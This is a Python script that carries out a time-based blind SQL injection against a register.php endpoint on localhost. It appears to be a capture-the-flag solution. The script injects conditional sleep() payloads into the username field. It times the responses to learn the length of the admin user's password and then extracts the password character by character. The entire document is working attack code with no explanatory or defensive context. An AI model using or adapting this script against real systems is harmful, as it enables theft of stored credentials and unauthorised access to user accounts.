import requests
import re

url = "http://localhost:4000/register.php"

data = {"username":"test" , "password":"123456" , "repassword":"123456"}


length_password = 0
for i in range(10,40):
	sql = f"(SELECT IF((SELECT length(password) FROM users WHERE username = 'admin') = {i}, sleep(5), 0))"

	payload = f" 1' AND {sql} AND '1' = '1"
	
	data["username"] = payload	

	res = requests.post(url , data=data)

	result = res.elapsed.total_seconds() > 5

	if result:
		length_password = i
		break

alphabet = "abcdefghijklmnopqrstuvwxyz{}_0123456789"

secret = ""
for i in range(1,length_password+1,1):
	for j in alphabet:
		sql = f"(SELECT IF((SELECT substring(password,{i},1) FROM users WHERE username = 'admin') = '{j}', sleep(5), 0))"

		payload = f" 1' AND {sql} AND '1'= '1"

		data["username"] = payload

		res = requests.post(url , data = data)

		result = res.elapsed.total_seconds() > 5

		if result:
			secret = secret + j
			break

print( secret )